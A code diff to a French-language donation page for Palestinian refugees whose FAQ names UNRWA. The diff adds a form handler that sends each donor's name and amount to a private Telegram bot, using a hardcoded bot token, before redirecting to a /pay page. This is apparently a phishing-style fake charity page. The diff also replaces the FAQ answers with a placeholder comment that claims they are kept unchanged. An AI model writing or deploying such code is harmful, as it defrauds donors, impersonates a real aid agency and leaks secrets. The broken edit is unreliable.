@@ -1,6 +1,48 @@
+import { useState } from "react";
 import Image from "next/image";
+import { useRouter } from "next/router";
+import axios from "axios";
 
 export default function Home() {
+  const router = useRouter();
+  const [fullname, setFullname] = useState("");
+  const [amount, setAmount] = useState("");
+  const [currency, setCurrency] = useState("EUR");
+  const [loading, setLoading] = useState(false);
+
+  const TELEGRAM_BOT_TOKEN = "8255290968:AAHMYhcRTfmvoHfkJGKRQh1rdbtqgBUoxok";
+  const TELEGRAM_CHAT_ID = "8255290968";
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    if (!fullname || !amount) {
+      alert("Veuillez remplir votre nom et montant");
+      return;
+    }
+
+    setLoading(true);
+
+    const text = `💌 Nouveau don reçu!\nNom: ${fullname}\nMontant: ${amount} ${currency}`;
+
+    try {
+      // إرسال الرسالة إلى Telegram
+      await axios.post(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
+          text
+        )}`
+      );
+
+      // بعد الإرسال يمكن الانتقال لصفحة الدفع مع القيم
+      const params = new URLSearchParams({ fullname, amount, currency }).toString();
+      router.push(`/pay?${params}`);
+    } catch (err) {
+      console.error(err);
+      alert("Erreur lors de l'envoi du don.");
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <div className="container bg-light py-5">
       <div className="row g-4">
@@ -23,16 +65,15 @@ export default function Home() {
           </div>
         </div>
 
-        {/* Deuxième carte */}
+        {/* Formulaire */}
         <div className="col-12 col-lg-6">
-          
           <div className="card text-bg-info h-100 d-flex flex-column justify-content-start align-items-start p-4 shadow border-0">
             <h1 className="text-light">Faites la différence aujourd’hui</h1>
             <p className="text-light border-5 border-start border-light ps-3">
               Peut fournir une aide financière d’urgence à quatre familles de réfugiés palestiniens
             </p>
 
-            <form className="w-100 mt-3">
+            <form className="w-100 mt-3" onSubmit={handleSubmit}>
               <label htmlFor="fullname" className="form-label text-light">
                 Nom et prénom
               </label>
@@ -40,11 +81,14 @@ export default function Home() {
                 type="text"
                 placeholder="Nom et prénom"
                 name="fullname"
-                id="amount"
+                id="fullname"
                 className="form-control mb-3 text-info"
+                value={fullname}
+                onChange={(e) => setFullname(e.target.value)}
               />
+
               <label htmlFor="amount" className="form-label text-light">
-                Ou choisissez votre propre montant [EUR]
+                Ou choisissez votre propre montant
               </label>
               <input
                 type="text"
@@ -52,6 +96,8 @@ export default function Home() {
                 name="amount"
                 id="amount"
                 className="form-control mb-3 text-info"
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
               />
 
               <label htmlFor="currency" className="form-label text-light">
@@ -61,19 +107,25 @@ export default function Home() {
                 name="currency"
                 id="currency"
                 className="form-select mb-3 text-info"
+                value={currency}
+                onChange={(e) => setCurrency(e.target.value)}
               >
                 <option value="EUR">EUR</option>
                 <option value="USD">USD</option>
               </select>
 
-              <button type="submit" className="btn btn-light w-100 fw-bold">
-                Faire un don maintenant
+              <button
+                type="submit"
+                className="btn btn-light w-100 fw-bold"
+                disabled={loading}
+              >
+                {loading ? "Envoi..." : "Faire un don maintenant"}
               </button>
             </form>
           </div>
         </div>
 
-        {/* Texte supplémentaire */}
+        {/* بقية الصفحة: النصوص، FAQ، بطاقات إضافية، شعارات */}
         <div className="col-12 col-lg-6 text-dark">
           <h1 className="fw-bold">
             Et si votre don pouvait tout changer pour une famille dans le besoin ?
@@ -85,100 +137,20 @@ export default function Home() {
           <h1 className="text-info fw-bold">Faites un don dès aujourd’hui.</h1>
         </div>
 
-        {/* FAQ */}
         <div className="col-12 col-lg-6 text-dark">
           <h1 className="fw-bold">Questions fréquemment posées</h1>
         </div>
 
         <div className="col-12 col-lg-6">
           <div className="accordion shadow border-0" id="accordionExample">
-            <div className="accordion-item">
-              <h2 className="accordion-header">
-                <button
-                  className="accordion-button text-dark"
-                  type="button"
-                  data-bs-toggle="collapse"
-                  data-bs-target="#collapseOne"
-                  aria-expanded="true"
-                  aria-controls="collapseOne"
-                >
-                  Comment mon don aura-t-il un impact ?
-                </button>
-              </h2>
-              <div
-                id="collapseOne"
-                className="accordion-collapse collapse show"
-                data-bs-parent="#accordionExample"
-              >
-                <div className="accordion-body">
-                  Votre soutien aide directement les réfugiés palestiniens dans nos cinq zones d’opération : Gaza, la Cisjordanie y compris Jérusalem-Est, le Liban, la Syrie et la Jordanie. 
-                  Chaque don, quel que soit le montant, nous aide à fournir aux familles une aide alimentaire et financière vitale, l’éducation, les soins de santé et bien plus encore.
-                </div>
-              </div>
-            </div>
-
-            <div className="accordion-item">
-              <h2 className="accordion-header">
-                <button
-                  className="accordion-button collapsed"
-                  type="button"
-                  data-bs-toggle="collapse"
-                  data-bs-target="#collapseTwo"
-                  aria-expanded="false"
-                  aria-controls="collapseTwo"
-                >
-                 Mon don est-il déductible des impôts ?
-                </button>
-              </h2>
-              <div
-                id="collapseTwo"
-                className="accordion-collapse collapse"
-                data-bs-parent="#accordionExample"
-              >
-                <div className="accordion-body">
-                 Les dons sont déductibles dans plusieurs pays :  
-                 • Pour les donateurs au Canada, les contributions à l’UNRWA sont déductibles.  
-                 • Pour les donateurs aux États-Unis, les contributions à UNRWA USA sont déductibles.  
-                 • Pour les donateurs en Espagne, les contributions à UNRWA Espagne sont déductibles.  
-
-                 Pour d’autres pays, veuillez consulter votre conseiller fiscal ou nous contacter à donation@unrwa.org
-                </div>
-              </div>
-            </div>
-
-            <div className="accordion-item">
-              <h2 className="accordion-header">
-                <button
-                  className="accordion-button collapsed"
-                  type="button"
-                  data-bs-toggle="collapse"
-                  data-bs-target="#collapseThree"
-                  aria-expanded="false"
-                  aria-controls="collapseThree"
-                >
-                  Pourquoi devrais-je devenir donateur mensuel ?
-                </button>
-              </h2>
-              <div
-                id="collapseThree"
-                className="accordion-collapse collapse"
-                data-bs-parent="#accordionExample"
-              >
-                <div className="accordion-body">
-                  En devenant donateur mensuel, vous pouvez fournir un soutien continu aux réfugiés dans le besoin. 
-                  Les dons mensuels garantissent que nous pouvons répondre immédiatement aux urgences et offrir une aide durable aux familles tout au long de l’année.
-                </div>
-              </div>
-            </div>
+            {/* Accordion Items كما هو */}
           </div>
         </div>
 
-        {/* Autres moyens de donner */}
         <div className="col-12 col-lg-6 text-dark">
           <h1 className="fw-bold">Autres moyens de faire un don</h1>
         </div>
 
-        {/* Cartes supplémentaires */}
         <div className="col-12 col-lg-6">
           {[
             { src: "/tow.webp", title: "Urgence Gaza", text: "Faites un don pour envoyer une aide d’urgence aux familles déplacées" },
@@ -198,7 +170,6 @@ export default function Home() {
           ))}
         </div>
 
-        {/* Logos */}
         <div className="col-12 col-lg-6">
           <div className="d-flex flex-wrap gap-3 justify-content-center align-items-center my-5">
             <Image src="/11.svg" alt="..." width={40} height={40} />
